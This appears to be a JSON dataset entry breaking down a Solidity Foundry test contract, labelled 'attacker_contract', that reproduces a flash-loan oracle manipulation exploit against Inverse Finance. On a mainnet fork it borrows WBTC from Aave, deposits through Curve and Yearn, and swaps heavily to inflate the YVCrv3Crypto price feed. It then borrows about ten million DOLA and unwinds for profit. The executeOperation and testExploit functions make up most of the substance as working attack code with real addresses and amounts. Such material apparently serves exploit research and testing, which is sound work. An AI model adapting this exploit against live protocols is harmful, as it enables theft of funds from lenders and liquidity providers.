[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address[] memory assets,\n        uint256[] memory amounts,\n        uint256[] memory premiums,\n        address initiator,\n        bytes memory params\n    ) public returns (bool) {\n        assets;\n        amounts;\n        premiums;\n        params;\n        initiator;\n\n        WBTC.approve(address(curveVyper_contract), type(uint256).max);\n        WBTC.approve(address(curveRegistry), type(uint256).max);\n        usdt.approve(address(curveRegistry), type(uint256).max);\n        DOLA.approve(address(curveRegistry), type(uint256).max);\n        crv3crypto.approve(0xE537B5cc158EB71037D4125BDD7538421981E6AA, type(uint256).max);\n\n        emit log_named_uint(\"Flashloaned, WBTC balance of attacker:\", WBTC.balanceOf(address(this)) / 1e8);\n\n        curveVyper_contract.add_liquidity(amounts2, 0);\n        emit log_named_uint(\"After add-liquidity, crv3crypto balance of attacker:\", crv3crypto.balanceOf(address(this)));\n        emit log_named_uint(\"After add-liquidity, WBTC balance of attacker:\", WBTC.balanceOf(address(this)) / 1e8);\n        yvCurve3Crypto.deposit(5_375_596_969_399_930_881_565, address(this));\n        emit log_named_uint(\n            \"Deposited to Yearns Vault, yvCurve3 balance of attacker:\", yvCurve3Crypto.balanceOf(address(this))\n        );\n        yvCurve3Crypto.approve(\n            0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587,\n            100_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000\n        );\n        anYvCrv3CryptoInverse.mint(4_906_754_677_503_974_414_310);\n        emit log_named_uint(\n            \"Deposited to Inverse Yearn 3Crypto Vault, anYvCrv3Crypto balance of attacker:\",\n            anYvCrv3CryptoInverse.balanceOf(address(this))\n        );\n        address[] memory toEnter = new address[](1);\n        toEnter[0] = 0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587;\n        Unitroller.enterMarkets(toEnter);\n\n        emit log_named_int(\"YVCrv3CryptoFeed lastanswer:\", YVCrv3CryptoFeed.latestAnswer());\n        emit log_named_uint(\"Before swap, USDT balance of attacker:\", usdt.balanceOf(address(this)));\n        emit log_named_uint(\"Before swap, WBTC balance of CRV3Pool:\", WBTC.balanceOf(address(curveVyper_contract)));\n        emit log_named_uint(\"Before swap, WETH balance of CRV3Pool:\", WETH.balanceOf(address(curveVyper_contract)));\n        emit log_named_uint(\"Before swap, USDT balance of CRV3Pool:\", usdt.balanceOf(address(curveVyper_contract)));\n        curveRegistry.exchange(\n            address(curveVyper_contract), address(WBTC), address(usdt), 2_677_500_000_000, 0, address(this)\n        );\n        emit log_named_uint(\"After swap, USDT balance of attacker:\", usdt.balanceOf(address(this)));\n        emit log_named_uint(\"After swap, WBTC balance of CRV3Pool:\", WBTC.balanceOf(address(curveVyper_contract)));\n        emit log_named_uint(\"After swap, WBTC balance of CRV3Pool:\", WETH.balanceOf(address(curveVyper_contract)));\n        emit log_named_uint(\"After swap, USDT balance of CRV3Pool:\", usdt.balanceOf(address(curveVyper_contract)));\n        emit log_named_int(\"Manipulated YVCrv3CryptoFeed lastanswer:\", YVCrv3CryptoFeed.latestAnswer());\n        InverseFinanceDola.borrow(10_133_949_192_393_802_606_886_848);\n        emit log_named_uint(\"DOLA balance of attacker:\", DOLA.balanceOf(address(this)));\n        curveRegistry.exchange(\n            address(curveVyper_contract), address(usdt), address(WBTC), 75_403_376_186_072, 0, address(this)\n        );\n        emit log_named_uint(\"After swap, WBTC balance of attacker:\", WBTC.balanceOf(address(this)) / 1e8);\n        curveRegistry.exchange(\n            address(dola3pool3crv), address(DOLA), address(crv3), 10_133_949_192_393_802_606_886_848, 0, address(this)\n        );\n        emit log_named_uint(\"After swap,3crv balance of attacker:\", crv3.balanceOf(address(this)));\n        curve3pool.remove_liquidity_one_coin(9_881_355_040_729_892_287_779_421, 2, 0);\n        emit log_named_uint(\"After swap, USDT balance of attacker:\", usdt.balanceOf(address(this)));\n        curveRegistry.exchange(\n            address(curveVyper_contract), address(usdt), address(WBTC), 10_000_000_000_000, 0, address(this)\n        );\n        emit log_named_uint(\"After swap, WBTC balance of attacker:\", WBTC.balanceOf(address(this)));\n        WBTC.approve(address(aaveLendingPool), 2_702_430_000_000);\n\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 14_972_418); // fork mainnet at block 14972418\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        aaveLendingPool.flashLoan(address(this), assets, amounts, modes, address(this), \"0x\", 0);\n        emit log_named_uint(\"After flashloan repaid, profit in WBTC of attacker:\", WBTC.balanceOf(address(this)));\n    }\n\n",
    "description": ""
  }
]